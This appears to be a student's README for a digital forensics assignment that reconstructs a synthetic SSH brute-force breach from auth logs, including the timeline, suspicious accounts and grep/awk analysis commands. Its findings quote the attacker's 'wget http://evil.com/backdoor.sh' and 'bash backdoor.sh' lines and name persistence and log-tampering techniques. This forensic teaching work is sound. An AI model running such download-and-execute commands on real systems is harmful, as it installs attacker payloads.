# 🔍 SSH Log Forensics — Digital Incident Investigation

> A structured digital forensics investigation reconstructing a real-world SSH brute-force attack and post-exploitation from authentication log files, following professional chain-of-custody and forensic methodology.

![Security](https://img.shields.io/badge/Category-Digital%20Forensics-purple)
![Tools](https://img.shields.io/badge/Tools-grep%20%7C%20awk%20%7C%20sed%20%7C%20Linux%20CLI-blue)
![Evidence](https://img.shields.io/badge/Evidence-SSH%20Auth%20Logs-orange)
![Institution](https://img.shields.io/badge/Institution-PUCIT-green)

---

## 📋 Overview

This project presents a complete digital forensics investigation conducted on two SSH authentication log files (`auth_pre.log` and `auth_post.log`) collected from a compromised Linux server on **10 April 2025**.

Using only CLI log analysis tools, the investigation identified the attacker, reconstructed the full attack timeline down to the second, determined what the attacker did on the system, identified suspicious insider activity, and produced findings suitable for both technical and executive audiences — all while maintaining proper forensic evidence handling principles.

---

## 🎯 Key Findings

### Attacker Identified
- **IP Address:** `185.130.5.253`
- **Method:** Automated brute-force tool — 6 consecutive failed root login attempts with incrementing port numbers over ~2.5 minutes
- **Not present** in the pre-attack log — confirmed as external attacker, not a known user

### Breach Confirmed
- **Time of compromise:** `2025-04-10 20:20:10`
- **Account compromised:** `root` (full administrative access)
- **Authentication method:** Password brute-force (`Accepted password for root`)

### Post-Exploitation Actions
| Time | Command | Purpose |
|------|---------|---------|
| 20:22:15 | `wget http://evil.com/backdoor.sh` | Download malicious payload |
| 20:23:40 | `bash backdoor.sh` | Execute backdoor as root |

The attacker was active for approximately **14 minutes** before disconnecting. The speed of payload deployment (2 minutes after gaining access) confirms this was a **prepared, deliberate attack** — not opportunistic.

### Persistence Mechanism
Execution of `backdoor.sh` as root almost certainly installed one or more of:
- SSH authorized key injection (`/root/.ssh/authorized_keys`)
- Cron job for persistent re-connection
- Reverse shell
- Hidden user account with UID 0

---

## ⏱️ Full Attack Timeline

| Time | Event |
|------|-------|
| 20:15:22 | Legitimate user `john` logs in from internal IP — server in normal operation |
| 20:17:45 | First brute-force attempt from `185.130.5.253` |
| 20:18:10–20:19:55 | Five more failed root login attempts — automated tool cycling passwords |
| **20:20:10** | **BREACH: Root login accepted — full system compromise** |
| 20:21:30 | Interactive root PAM session opened |
| 20:22:15 | `wget` downloads `backdoor.sh` from attacker-controlled server |
| 20:23:40 | `backdoor.sh` executed with root privileges |
| 20:35:22 | Attacker disconnects — backdoor likely still active |
| 20:38:10 | Suspicious failed login for `oracle` from internal IP |
| 21:24:30 | Suspicious root cron execution — possible newly installed task |
| 21:44:33 | Second external IP probing root login |

---

## 👤 Compromised & Suspicious Accounts

| Account | Status | Reasoning |
|---------|--------|-----------|
| `root` | ✅ Confirmed Compromised | External attacker gained full access and executed malicious commands |
| `john` | ⚠️ Suspicious | Ran `nmap -sV localhost` and `ss -tulpn` — network reconnaissance tools — both pre and post attack |
| `alice` | ⚠️ Suspicious | Ran `chmod 777 /tmp` pre-attack — classic staging area preparation; failed login followed by success post-attack |

---

## 🔎 Pre vs Post-Attack Log Comparison

| Difference | Pre-Attack | Post-Attack |
|------------|------------|-------------|
| IP `185.130.5.253` | Absent | 6 rapid targeted root attempts |
| Root session type | Automated cron (< 1 second) | Interactive session from external IP |
| Commands under root | Routine sysadmin (`apt`, `systemctl`, `zip`) | `wget` + `bash` executing external payload |

---

## 🛠️ CLI Tools & Techniques

```bash
# Merge and sort both logs chronologically
cat auth_pre.log auth_post.log | sort -k1,2 > merged_timeline.log

# Count failed login attempts per IP — identify brute-force sources
grep "Failed password" merged_timeline.log | grep -oP "from \K[\d.]+" | sort | uniq -c | sort -rn

# Extract all sudo commands with timestamps
awk '/sudo/ {print $1, $2, $0}' auth_pre.log auth_post.log | sort

# Count targeted usernames
awk '/Failed password/ {print $9}' merged_timeline.log | sort | uniq -c | sort -rn
```

---

## 📚 Theoretical Coverage

The investigation also addresses key forensic principles:

- **Chain of Custody** — why original evidence must never be modified, and correct acquisition procedure
- **Log Integrity & Track Erasure** — how attackers cover tracks (`sed -i`, truncation, timestomping) and how investigators detect it (hash mismatch, timeline gaps, remote syslog)
- **False Positive Analysis** — distinguishing the real attacker from background internet scanner noise (`203.0.113.5`)
- **Legal & Ethical Considerations** — examining employee accounts under GDPR Article 6(1)(f) and the Computer Misuse Act
- **Forensics Report Structure** — executive summary, scope, findings, chain of custody, recommendations

---

## 📁 Repository Structure

```
ssh-log-forensics/
├── README.md
├── report/
│   └── Digital_Forensics_Investigation_Khadija_Amer.pdf
└── logs/
    ├── auth_pre.log
    └── auth_post.log
```

---

## ⚠️ Disclaimer

All log files used in this investigation are synthetic, created for educational purposes as part of a university assignment. No real systems or individuals were involved.

---

## 👩‍💻 Author

**Khadija Amer** — BCSF24A030  
Punjab University College of Information Technology (PUCIT)  
Course: Information Security | Spring 2026  
Instructor: Sir Shehryar Raza
